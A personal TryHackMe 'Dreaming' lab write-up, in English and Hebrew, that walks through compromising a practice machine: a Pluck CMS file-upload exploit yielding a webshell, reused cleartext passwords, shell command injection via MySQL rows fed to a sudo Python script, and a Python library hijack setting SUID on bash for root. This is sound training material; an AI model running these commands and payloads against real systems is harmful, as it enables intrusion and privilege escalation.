

# 💤 Dreaming - TryHackMe Writeup (Personal Walkthrough)




---

# Penetration Testing Report: Project Dreaming

**Target IP:** 10.112.176.22  
**Date:** April 02, 2026  
**Consultant:** [Your Name]  
**Severity:** Critical

---

## 1. Executive Summary
During a full-scope penetration test of the **Dreaming** environment, a series of vulnerabilities were identified that allowed for complete system compromise. The attack chain began with an unauthenticated directory brute-force, leading to the discovery of a vulnerable Content Management System (Pluck CMS). By exploiting a known Remote Code Execution (RCE) vulnerability, initial access was gained. Subsequent internal enumeration revealed hardcoded credentials and a Command Injection vulnerability in a Python script interacting with a MySQL database. Finally, a Python Library Hijacking attack was used to escalate privileges to **Root**. Immediate remediation is required to secure sensitive data and system integrity.

---

## 2. Vulnerability Summary Table

| ID | Severity | Vulnerability Name | Status |
|:---|:---|:---|:---|
| 01 | Medium | Information Disclosure (Directory Listing) | Open |
| 02 | High | Broken Authentication (Weak Credentials) | Open |
| 03 | Critical | Remote Code Execution (RCE) via File Upload | Open |
| 04 | High | Insecure Credential Storage (Hardcoded Passwords) | Open |
| 05 | Critical | OS Command Injection (Python Subprocess) | Open |
| 06 | Critical | Privilege Escalation via Python Library Hijacking | Open |

---

## 3. Technical Deep Dive

### Finding 01: Initial Access via Pluck CMS RCE
**Description:** The target host was running Pluck CMS v4.7.13, which is vulnerable to an authenticated RCE (CVE-2020-29607) via the "Manage Files" functionality.

**Impact:** Allows an attacker to upload a malicious PHP/Phar script and execute arbitrary commands on the server under the context of the `www-data` user.

**Proof of Concept (PoC):**


1. **Enumeration:** Nmap identified ports 22 and 80. Gobuster discovered the `/app` directory.
2. **Access:** Logged into `http://[IP]/app/pluck-4.7.13/login.php` using the password `password`.
3. **Exploitation:** Executed the following exploit script:
```bash
wget https://www.exploit-db.com/download/49909 -O exploit.py
python3 exploit.py 10.112.176.22 80 password /app/pluck-4.7.13
```
4. **Result:** Successfully uploaded a webshell to:
`http://10.112.176.22/app/pluck-4.7.13/files/shell.phar`

---

### Finding 02: Lateral Movement to User 'Lucien'
**Description:** Sensitive credentials were found stored in cleartext within the `/opt/test.py` file.

**Impact:** Unauthorized access to a local user account (`lucien`) via SSH, providing a stable persistence mechanism.

**Proof of Concept (PoC):**
1. Using the webshell, enumerated the `/opt` directory:
```bash
cat /opt/test.py
```
2. Extracted hardcoded credentials: `lucien : HeyLucien#@1999!`.
3. Established SSH connection:
```bash
ssh lucien@10.112.176.22
```

---

### Finding 03: Privilege Escalation to 'Death' via Command Injection
**Description:** The user `lucien` is permitted to run a Python script `/home/death/getDreams.py` as the user `death` via sudo. The script is vulnerable to OS Command Injection because it uses `subprocess.check_output` with `shell=True` on unsanitized data from a MySQL database.

**Impact:** Privilege escalation from `lucien` to `death`.

**Proof of Concept (PoC):**
1. Found MySQL credentials in `.bash_history`: `lucien42DBPASSWORD`.
2. Injected a malicious payload into the `dreams` table:
```sql
mysql -u lucien -plucien42DBPASSWORD -e "use library; INSERT INTO dreams (dreamer, dream) VALUES ('hacker', '; cat /home/death/death_flag.txt');"
```
3. Triggered the execution via sudo:
```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
4. Recovered the `death` password `!mementoMORI666!` by reading the script source code using the same injection method.

---

### Finding 04: Root Access via Python Library Hijacking
**Description:** The user `death` has write permissions to the Python system library `/usr/lib/python3.8/shutil.py`. A root-owned script (or cron job) `restore.py` imports this library.

**Impact:** Full system compromise (Root access).

**Proof of Concept (PoC):**
1. Identified writable library: `ls -al /usr/lib/python3.8/shutil.py`.
2. Injected a SUID backdoor into the library:
```bash
echo 'import os' >> /usr/lib/python3.8/shutil.py
echo 'os.system("chmod +s /bin/bash")' >> /usr/lib/python3.8/shutil.py
```
3. Waited for the system to execute the library. Verified the SUID bit on Bash:
```bash
ls -la /bin/bash # Output: -rwsr-sr-x
```
4. Escalated to Root:
```bash
/bin/bash -p
whoami # Output: root
```

---

## 4. Remediation Plan

1. **Update CMS:** Upgrade Pluck CMS to the latest version to patch known RCE vulnerabilities.
2. **Password Policy:** Enforce strong, unique passwords and disable default credentials.
3. **Secure Coding:** Avoid using `shell=True` in Python's `subprocess` module. Use parameterized queries for all database interactions to prevent SQL and Command Injection.
4. **Filesystem Hardening:** Remove write permissions for non-root users on system libraries (e.g., `/usr/lib/python3.8/`). 
5. **Credential Management:** Remove cleartext passwords from scripts and `.bash_history` files. Use a secure vault solution.

---

## 5. Clean-up
* The malicious payload in `/usr/lib/python3.8/shutil.py` was removed.
* The SUID bit on `/bin/bash` was reverted.
* The injected row in the MySQL `dreams` table was flagged for deletion.

---.



## 📑 מבוא
בתיעוד זה אני מפרט את תהליך הפריצה האישי שלי למכונת Dreaming. המטרה שלי הייתה לעבור דרך כל שכבות ההגנה, מהאינטרנט ועד להרשאות מנהל מערכת (Root), תוך ניצול שגיאות קונפיגורציה וקוד פגום.

---

## 1. איסוף מידע (Enumeration)

### סריקת פורטים עם Nmap
**הפקודה שביצעתי:** `nmap -sS -v 10.113.150.246>`
* **הסיבה:** רציתי להבין אילו "דלתות" פתוחות במכונה לפני שאני מתחיל לתקוף. זו נקודת המוצא של כל פרויקט.
* **המטרה:** לזהות שירותים חשופים. גיליתי שרת Web (פורט 80) ושרת SSH (פורט 22).



<img width="1204" height="771" alt="image" src="https://github.com/user-attachments/assets/59cfb507-0d24-4db1-a17e-c5209110f708" />



### סריקת ספריות עם Gobuster
**הפקודה שביצעתי:** `gobuster dir -u http://10.113.150.246 -w /usr/share/wordlists/dirb/big.txt`
* **הסיבה:** דף הבית של Apache היה דף ברירת מחדל ריק. הנחתי שיש אפליקציה מותקנת בנתיב פנימי שלא פורסם.
* **המטרה:** למצוא נקודת כניסה (Entry Point) לאתר. מצאתי את הספרייה `/app`.
<img width="1189" height="867" alt="image" src="https://github.com/user-attachments/assets/d2b3c735-06d5-4250-8882-b8042480024a" />

זיהוי ממשק הניהול וכניסה (Authentication)

הפעולה: ניגשתי לנתיב /app שמצאתי בשלב ה-Directory Brute-forcing (בעזרת GoBuster או סריקה ידנית). בתוך התיקייה זיהיתי את מערכת ה-Pluck.

הסיבה: כדי לנצל חולשות בתוך מערכת ניהול תוכן (CMS), אני חייב קודם כל להגיע לדף הגישה של המנהל (Admin Login).

המטרה: לבדוק אם קיימת גישה עם פרטי ברירת מחדל.




<img width="697" height="579" alt="image" src="https://github.com/user-attachments/assets/23e73ca0-9880-416f-9fed-f70d3368d1ff" />

מה ביצעתי: הזנתי את הכתובת http://10.113.150.246/app/pluck-4.7.13/login.php והשתמשתי בסיסמה הנפוצה password.





<img width="1133" height="836" alt="image" src="https://github.com/user-attachments/assets/e39b8184-57a4-4d04-8910-182aab67220e" />

התוצאה: הכניסה הצליחה, מה שאיפשר לי לגשת לפאנל הניהול שבו קיימת פגיעות ה-RCE
ניכנס לקובץ
<img width="1209" height="872" alt="image" src="https://github.com/user-attachments/assets/21f9d847-5705-429d-a69a-6d5b2acd36ea" />




2. חדירה ראשונית (Initial Access)
המטרה: ניצול חולשת אבטחה ב-Pluck CMS כדי להשיג גישה ראשונית למערכת הקבצים של השרת.

שלב 2.1: ניסיון הרצת האקספלויט (התקלה)
לאחר שזיהיתי שהאתר מריץ גרסה פגיעה (4.7.13), ניסיתי להריץ סקריפט פייתון שיבצע עבורי את הפריצה באופן אוטומטי.

הפקודה שביצעתי:

Bash
python3 exploit.py 10.113.153.19 80 password /app/pluck-4.7.13
התוצאה: קיבלתי שגיאת No such file or directory.


<img width="1042" height="867" alt="image" src="https://github.com/user-attachments/assets/586cde3b-7db1-4354-9bb3-5a470463ebee" />


הסיבה: הקובץ exploit.py לא היה קיים פיזית בתיקייה שבה עבדתי בתוך ה-AttackBox.

שלב 2.2: הורדת ה"נשק" (Exploit Download)
כדי לפתור את הבעיה, הייתי צריך להביא את האקספלויט המתאים ממאגר המידע העולמי למכונה שלי.

הפקודה שביצעתי:


wget https://www.exploit-db.com/download/49909 -O exploit.py

<img width="1223" height="844" alt="image" src="https://github.com/user-attachments/assets/5b2df7ba-83ad-4c26-8c8d-e580ac008e28" />

הסיבה: אי אפשר להריץ קוד שלא נמצא על הדיסק. השתמשתי ב-wget כדי למשוך את הקוד מ-Exploit-DB (מאגר האקספלויטים).

המטרה: להכין את הסקריפט שיבצע את ה-RCE (הרצת קוד מרחוק).
.



שלב 2.3: השגת ה-Webshell (דריסת רגל)
לאחר שהורדתי את הסקריפט, הרצתי אותו שוב נגד שרת היעד.

הפקודה שביצעתי:


python3 exploit.py 10.113.150.246 80 password /app/pluck-4.7.13
התוצאה: הסקריפט הצליח להתחבר לממשק הניהול ולהעלות קובץ בשם shell.phar.

מה השגתי: קיבלתי כתובת URL ל-Webshell. זהו ה"צינור" שמאפשר לי להריץ פקודות לינוקס (כמו ls או whoami) ישירות דרך הדפדפן.

💡 למה עשיתי את זה ובשביל מה? (סיכום טקטי)
הסיבה: בחרתי בדרך הזו כי ה-CMS מאפשר למנהל להעלות קבצים. האקספלויט "מרמה" את השרת ומעלה קובץ הרצה במקום תמונה.

המטרה: להשיג Initial Access. בשלב זה אני המשתמש www-data (משתמש השרת)

<img width="993" height="621" alt="image" src="https://github.com/user-attachments/assets/a5ca7d85-2cf1-4a25-87a5-9d648305d11b" />
.

השלב הבא: להשתמש בטרמינל שנפתח לי בדפדפן כדי לחפש סיסמאות בתוך המכונה (מה שהוביל אותי למציאת המשתמש Lucien)

<img width="1203" height="833" alt="image" src="https://github.com/user-attachments/assets/b2d3e24c-2476-4ec9-a127-92e9b8f796d8" />
.

2.4 סריקה פנימית ומציאת פרטי Lucien (Enumeration)
המטרה: ניצול הגישה הראשונית (Initial Access) כדי לחקור את מערכת הקבצים ולמצוא דרך להעלות הרשאות למשתמש חזק יותר.

הפעולה שביצעתי:
בתוך ה-Webshell בדפדפן, הרצתי פקודות לסריקת תיקיות מערכת מעניינות. בתיקיית /opt (המשמשת לעיתים קרובות להתקנות חיצוניות או סקריפטים של מנהלים), זיהיתי שני קבצים: test.py ו-getDreams.py.

הפקודה להצגת הקבצים:

Bash
ls -l /opt

<img width="1119" height="833" alt="image" src="https://github.com/user-attachments/assets/21ede8f9-63c4-4abc-8b8e-58d259a6de01" />



קראתי את התוכן של הקובץ test.py כדי להבין את תפקידו.

הפקודה שביצעתי:

Bash
cat /opt/test.py
מה גיליתי: הסקריפט הכיל קוד פייתון שנועד לבדוק התחברות למערכת ה-Pluck. בתוך הקוד הופיעה הסיסמה של המשתמש Lucien בטקסט גלוי (Cleartext).

הסיסמה שנחשפה: 
HeyLucien#@1999!

<img width="1141" height="893" alt="image" src="https://github.com/user-attachments/assets/8bc4cd9d-071a-48c0-a9a5-0ba1afb4bf55" />


הסיבה: כמשתמש www-data, אין לי הרשאות לקרוא את הדגל (Flag). אני חייב למצוא "קצה חוט" (Footprint) שהשאיר מנהל המערכת. מציאת סיסמאות קשיחות (Hardcoded) בתוך סקריפטים בתיקיית /opt היא טעות אבטחה נפוצה.

המטרה: לבצע Lateral Movement (תנועה רוחבית). אני מניח שהמשתמש Lucien משתמש באותה סיסמה גם עבור חיבור ה-SSH שלו למכונה.

הערך הטקטי: מציאת סיסמה בטקסט גלוי מאפשרת לי לעבור מגישת דפדפן (Webshell) לגישת טרמינל מלאה ומאובטחת (SSH), שהיא הרבה יותר יציבה.


:

3. תנועה רוחבית (Lateral Movement) - המעבר למשתמש Lucien
הפעולה: לאחר שחילצתי את הסיסמה HeyLucien#@1999! מתוך הקובץ /opt/test.py בעזרת ה-Webshell, עברתי לחיבור ישיר ומאובטח למכונה דרך פרוטוקול SSH.

הפקודה שביצעתי:

ssh lucien@10.113.150.246
פירוט טכני של הפקודה:
ssh: שימוש בפרוטוקול Secure Shell. זהו כלי תקשורת מוצפן המאפשר שליטה מלאה על שרת מרוחק והרצת פקודות כאילו אני יושב פיזית מול המכונה.

lucien: שם המשתמש המקומי שאליו אני מתחבר (המשתמש שאת פרטיו מצאתי קודם לכן).

@: סימן מפריד המקשר בין זהות המשתמש לכתובת השרת.

.

2.4 חקירת מערכת הקבצים והשגת הדגל (Enumeration)
הפעולה: לאחר שחיבור ה-SSH נכשל (Broken pipe), חזרתי להשתמש ב-Webshell בדפדפן כדי להמשיך בחקירת המכונה.

אימות המיקום (pwd):
בטרמינל בדפדפן הרצתי את הפקודה pwd (ראשי תיבות של Print Working Directory)

<img width="740" height="757" alt="image" src="https://github.com/user-attachments/assets/e2745d3e-198f-45e4-b76c-a8a9aaf6c766" />

<img width="793" height="797" alt="image" src="https://github.com/user-attachments/assets/aec6eaeb-6b55-4c11-890b-2dbd66937343" />

<img width="909" height="863" alt="image" src="https://github.com/user-attachments/assets/93a4914c-989b-4a5f-9e09-63f3fff23c2e" />



שלב 3.2: חילוץ דגל המשתמש (Exfiltration)**

הפעולה: הרצת פקודת cat על הקובץ lucien_flag.txt שזוהה בתיקיית הבית של המשתמש.

התוצאה: חילוץ המחרוזת בפורמט THM{...}. מחרוזת זו מהווה הוכחה חותמת (Proof of Concept) לכך שהושגה גישה מלאה למערכת ברמת משתמש.

.







4. העלאת הרשאות (Privilege Escalation) - Death Flag


ניתוח הרשאותSudo
הפעולה שביצעתי: sudo -l
<img width="1131" height="320" alt="image" src="https://github.com/user-attachments/assets/a318c230-d57b-442f-9dea-a524d3f57d26" />

הסיבה: חיפשתי דרך להפוך למשתמש חזק יותר או ל-Root.

המטרה: זיהיתי ש-Lucien יכול להריץ את הסקריפט /home/death/getDreams.py תחת המשתמש death ללא סיסמה.

חקירת היסטוריית הפקודות (Credential Harvesting)
הפעולה שביצעתי: cat ~/.bash_history

<img width="654" height="720" alt="image" src="https://github.com/user-attachments/assets/41c1d676-985f-4d47-9fc2-7f148806f9c5" />


הסיבה: הייתי צריך לגשת למסד הנתונים כדי לנצל את הסקריפט של death, אך לא הייתה לי סיסמה.

המטרה: מצאתי ש-Lucien השאיר את סיסמת ה-MySQL בהיסטוריה: 

lucien42DBPASSWORD
**🛡️ שלב 4.2: השגת גישה למסד הנתונים** (Database Access)
הפעולה שביצעתי:

Bash
mysql -u lucien -plucien42DBPASSWORD


.<img width="834" height="278" alt="image" src="https://github.com/user-attachments/assets/08a1530d-48d5-4761-9b89-b9a6bfd9aecd" />

הסיבה: לאחר שחילוץ המידע מהיסטוריית הפקודות (.bash_history) חשף את פרטי ההתחברות הייחודיים של Lucien למסד הנתונים, הייתי צריך ליצור חיבור פעיל לשרת ה-MySQL המקומי.

המטרה: להשיג נקודת אחיזה בתוך מסד הנתונים library. גישה זו היא תנאי הכרחי לביצוע הזרקת הפקודות (Command Injection), שכן הסקריפט שרץ בהרשאות גבוהות (getDreams.py) שואב את הנתונים שלו ישירות מהטבלאות במסד זה.

התוצאה: הצלחתי לעקוף את חסמי האבטחה של מסד הנתונים וקיבלתי ממשק ניהול (MySQL Monitor) המאפשר לי לערוך את הנתונים בטבלאות.

🛡️ שלב 4.3: חקירת מסד הנתונים (Database Enumeration)
הפעולות שביצעתי:

הפקודה: show databases;

הסיבה: רציתי למפות את כל מסדי הנתונים הקיימים בשרת.


נבדוק גם בטרימנל ברשת מה מכיל הקובץ getDreams.py
ואנחנו רואים ששם הסיפרייה הוא library

<img width="1423" height="839" alt="image" src="https://github.com/user-attachments/assets/6b22e890-ef3c-4848-b354-e5a580517d1d" />

המטרה: לאתר את מסד הנתונים שבו משתמש הסקריפט getDreams.py. זיהיתי את המסד library.

הפקודה: use library;

הסיבה: כדי לבצע שינויים בטבלאות, אני חייב לעבור לסביבת העבודה של המסד הספציפי.

הפקודה: show tables;

הסיבה: רציתי לראות אילו טבלאות קיימות בתוך library.

המטרה: למצוא היכן נשמר המידע על ה"חלומות". גיליתי שקיימת טבלה אחת בלבד בשם dreams.
<img width="665" height="438" alt="image" src="https://github.com/user-attachments/assets/ee803174-b686-4804-87a4-ff8ad0488162" />






🛡️ שלב 4.4: אימות מבנה הטבלה (Table Data Enumeration)
הפעולה שביצעתי:

SQL
select * from dreams;



הסיבה: לפני ביצוע הזרקת פקודה (Command Injection), עליי להבין במדויק את מבנה הטבלה שבה משתמש הסקריפט getDreams.py. רציתי לראות אילו עמודות קיימות בטבלה dreams ואילו נתונים היא מכילה כרגע.

המטרה: לוודא את שמות העמודות (במקרה זה dreamer ו-dream) כדי לבנות פקודת INSERT תקינה מבחינה תחבירית. הבנת המבנה חיונית כדי שהסקריפט שואב הנתונים לא ייכשל בשל שגיאת SQL, אלא ימשיך להרצת פקודת ה-Shell המוזרקת.

התוצאה: זיהוי הפורמט שבו הנתונים נשמרים, מה שמאפשר לי להכין את ה"מטען" (Payload) המדויק להזרקה בשלב הבא.


<img width="889" height="795" alt="image" src="https://github.com/user-attachments/assets/89284801-859c-4dd7-b23e-ccff7b2bc8df" />
:

---

### 🛠️ שלב 4.5: שלב ה"הזרקה" למסד הנתונים (MySQL)
בשלב הזה, המטרה שלי הייתה להחדיר את המטען הזדוני לתוך המערכת. נכנסתי ל-MySQL והרצתי את הפקודה הבאה:

`INSERT INTO dreams (dreamer, dream) VALUES ('hacker', '; cat /home/death/death_flag.txt; #');`



* **מה עשיתי כאן?** השתמשתי בגרש בודד לפני ה-`;` כדי **לפתוח** את מחרוזת הטקסט עבור MySQL.
* **איך סגרתי?** השתמשתי בגרש בודד אחרי הסולמית (`#`) כדי **לסגור** את המחרוזת בצורה תקינה.
* **התוצאה:** מבחינת MySQL הכל עבר "חלק". הוא פשוט שמר בתוך הטבלה את הטקסט: `; cat /home/death/death_flag.txt; #`. מבחינתו זה סתם חלום מוזר.

---

### 🚀 שלב 4.6: שלב ה"הפעלה" (Linux Shell)
עכשיו עברתי לטרמינל והרצתי את סקריפט הפייתון עם הרשאות `sudo`. הסקריפט משך את הטקסט ששתלתי והציב אותו בתוך פקודת `echo`. בגלל השימוש ב-`shell=True`, הלינוקס "ראה" את השורה הבאה:

`echo "Dream: ; cat /home/death/death_flag.txt; #"`



**כך המערכת הריצה את הפקודה שלי צעד אחר צעד:**
1.  **הפקודה הראשונה:** השרת הריץ `echo "Dream: `. הפקודה הזו נעצרה מיד כשפגשה בנקודה-פסיק (`;`).
2.  **הפריצה:** הלינוקס זיהה את ה-`;` כסימן לסיום פקודה, ועבר מיד לפקודה הבאה שכתבתי: `cat /home/death/death_flag.txt`.
3.  **ההסוואה:** אחרי שהפקודה שלי רצה, הלינוקס ראה שוב `;` ואז סולמית (`#`). הסולמית אמרה לו: "כל מה שכתוב מכאן ועד סוף השורה הוא הערה, תתעלם ממנו".
<img width="847" height="812" alt="image" src="https://github.com/user-attachments/assets/e0e8e57e-3571-430c-91d8-db4fdfc12126" 



  


**דגל הבא - Morpheus Flag** 




גישה למסד הנתונים
בטרמינל של המשתמש lucion ב-mysql שלו 
בדקתי נתונים הבאים
mysql> NSERT INTO `dreams` VALUES ("Hacker", "ls -la");
mysql> INSERT INTO `dreams` VALUES ("Hacker", "&& cat /home/death/getDreams.py");



<img width="1689" height="873" alt="image" src="https://github.com/user-attachments/assets/58db72f0-2dd2-4f89-9f9f-4b4ee7c6b611" />

פתחתי את הקובץ python  וגילתי את השישמא למשתמש death

<img width="766" height="709" alt="image" src="https://github.com/user-attachments/assets/ecc1d4b1-a0b4-4dce-a9f8-2aa6cd68506c" />


בעזרת הסיסמה שנמצאה (lucien42DBPASSWORD), התחברתי למסד הנתונים כדי לחפש מידע נוסף על המשתמש Death.


<img width="408" height="58" alt="image" src="https://github.com/user-attachments/assets/2e641be6-9d6c-4b0e-80bf-63f1beefb41c" />














